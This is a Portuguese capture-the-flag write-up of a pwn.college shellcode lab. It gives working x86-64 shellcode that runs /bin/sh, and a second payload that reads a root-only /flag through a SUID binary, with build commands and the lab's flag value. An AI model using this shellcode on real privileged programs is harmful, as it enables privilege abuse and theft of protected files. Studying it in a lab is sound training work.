# Writeup: pwn.college — Binary Exploitation: Basic Shellcode

## Descrição do Desafio

O desafio lê bytes do stdin, copia para a stack e os executa como código. O objetivo é injetar um shellcode que leia o arquivo `/flag` e imprima seu conteúdo.

Restrições informadas pelo binário:
- Todas as variáveis de ambiente e argumentos são sanitizados
- Todos os file descriptors > 2 são fechados
- O shellcode é copiado para a stack e executado — precisa ser **position-independent** (sem endereços absolutos)

```
Allocated 0x1000 bytes for shellcode on the stack at 0x7ffc6ad569e0!
Reading 0x1000 bytes from stdin.
```

---

## Contexto: SUID, UID e EUID

Antes de explorar, é importante entender o mecanismo de privilégios envolvido.

### Permissões do binário

```bash
$ ls -la /challenge/binary-exploitation-basic-shellcode
-rwsr-xr-x 1 root root 17520 Jan 27 2025 /challenge/binary-exploitation-basic-shellcode
```

O `s` no lugar do `x` do dono indica o **bit SUID** ativo. Isso significa que qualquer usuário que execute esse binário o fará **com o EUID do dono** — nesse caso, root.

### UID vs EUID

Todo processo no Linux carrega dois identificadores de usuário:

- **UID** — quem você realmente é. No nosso caso: `1000 (hacker)`. Não muda.
- **EUID** — quem o kernel considera que você é na hora de checar permissões de arquivos. Normalmente igual ao UID, mas o SUID pode alterá-lo.

Ao executar o binário com SUID (dono = root):

```
UID  = 1000  (hacker) — imutável
EUID = 0     (root)   — elevado pelo SUID
```

### Permissões do `/flag`

```bash
$ ls -la /flag
-r-------- 1 root root 58 Mar 23 23:57 /flag
```

Apenas root pode ler. Precisamos que nosso código rode com **EUID = 0**.

---

## Abordagem 1: Shell Interativo (não funcionou)

### O shellcode

A primeira tentativa foi um shellcode clássico que invoca `/bin/sh` via `execve`:

```asm
.global _start
_start:
.intel_syntax noprefix
    mov rax, 0x3b
    lea rdi, [rip + binsh]
    mov rsi, 0
    mov rdx, 0
    syscall
binsh:
    .string "/bin/sh"
```

### Compilação e extração

```bash
gcc -nostdlib -static -o shellcode shellcode.s
objcopy --dump-section .text=shellcode-raw shellcode
```

### Execução

```bash
cat shellcode-raw - | /challenge/binary-exploitation-basic-shellcode
```

> O `-` no `cat` faz com que, após enviar o shellcode-raw, o `cat` continue lendo do teclado — mantendo o stdin aberto para o shell interativo. Sem isso, o shell abriria e fecharia imediatamente ao encontrar EOF.

### Resultado

O shell abriu, mas ao tentar `cat /flag`:

```
cat /flag
cat: /flag: Permission denied
```

### Por que não funcionou?

Embora o `/bin/sh` herde o EUID do processo pai (EUID = 0), o bash/sh possui uma **proteção intencional**: ao iniciar, ele compara UID e EUID. Se forem diferentes — situação típica de SUID — ele força `EUID = UID` para evitar escalonamento de privilégio acidental:

```c
// Comportamento interno do bash ao iniciar:
if (current_user.euid != current_user.uid)
    setuid(current_user.uid);  // dropa o privilégio
```

O fluxo completo:

```
/challenge/binary  →  EUID = 0 (root)
    execve("/bin/sh")
        /bin/sh herda EUID = 0
        /bin/sh detecta EUID (0) != UID (1000)
        /bin/sh executa setuid(1000)  ←  dropa privilégio
        EUID agora = 1000 (hacker)
        cat /flag  →  Permission denied ❌
```

---

## Abordagem 2: Syscalls Diretas (funcionou!)

### A ideia

Em vez de invocar um novo processo (`execve`), fazemos as syscalls **diretamente dentro do processo SUID**. Sem `execve`, não há processo filho, não há shell, não há nada que drope o EUID. O código roda no mesmo processo com EUID = 0 o tempo todo.

```
/challenge/binary  →  EUID = 0 (root)
    [shellcode roda aqui, no mesmo processo]
    open("/flag")  ←  kernel checa EUID = 0  ✅
    read(...)
    write(...)
    [nenhum processo novo criado, EUID nunca foi alterado]
```

### O shellcode

```asm
.global _start
_start:
.intel_syntax noprefix

    # open("/flag", O_RDONLY) → retorna fd em rax
    mov rax, 2
    lea rdi, [rip + flag]
    mov rsi, 0
    mov rdx, 0
    syscall

    # salva o fd em rdi para o read
    mov rdi, rax

    # read(fd, buf, 0x100) → lê o conteúdo do arquivo
    mov rax, 0
    lea rsi, [rip + results]
    mov rdx, 0x100
    syscall

    # write(stdout, buf, 0x100) → imprime na tela
    mov rax, 1
    mov rdi, 1
    lea rsi, [rip + results]
    mov rdx, 0x100
    syscall

    # exit(0)
    mov rax, 60
    mov rdi, 0
    syscall

flag:
    .string "/flag"
results:
    .space 100
```

### Detalhes importantes

**`lea rdi, [rip + flag]`** — obrigatório para position-independence. O shellcode roda em endereço aleatório na stack (ASLR). Usar `mov rdi, flag` colocaria um endereço absoluto que seria inválido em runtime. O `lea` com `rip` calcula o endereço relativo à instrução atual, funcionando em qualquer posição de memória.

**Retornos das syscalls** — cada syscall retorna seu resultado em `rax`:

| Syscall | `rax` no retorno |
|---|---|
| `open` | file descriptor (inteiro >= 0) |
| `read` | bytes efetivamente lidos |
| `write` | bytes efetivamente escritos |
| `exit` | não retorna |

Por isso salvamos o fd logo após o `open` — o `mov rax, 0` da syscall `read` sobrescreveria o valor.

**`.space 100`** — reserva 100 bytes no próprio shellcode para usar como buffer temporário entre `read` e `write`. É o equivalente em assembly de `char buf[100]`.

### Compilação e execução

```bash
gcc -nostdlib -static -o shellcode shellcode.s
objcopy --dump-section .text=shellcode-raw shellcode
cat shellcode-raw | /challenge/binary-exploitation-basic-shellcode
```

### Resultado

```
pwn.college{MppM_ZP5xYyNrvnw3n5OIn8OREQ.ddTMywCOzYTNxEzW}
```

---

## Resumo

| Abordagem | Resultado | Motivo |
|---|---|---|
| `execve("/bin/sh")` | ❌ Permission denied | `/bin/sh` dropa o EUID ao iniciar |
| Syscalls diretas (`open/read/write`) | ✅ Flag obtida | EUID = 0 mantido durante todo o processo |

A lição principal: **o bit SUID eleva o EUID do processo, mas qualquer novo processo criado via `execve` pode (e normalmente vai) dropar esse privilégio**. Fazer syscalls diretamente, sem criar novos processos, preserva o EUID elevado e permite acessar arquivos restritos a root.
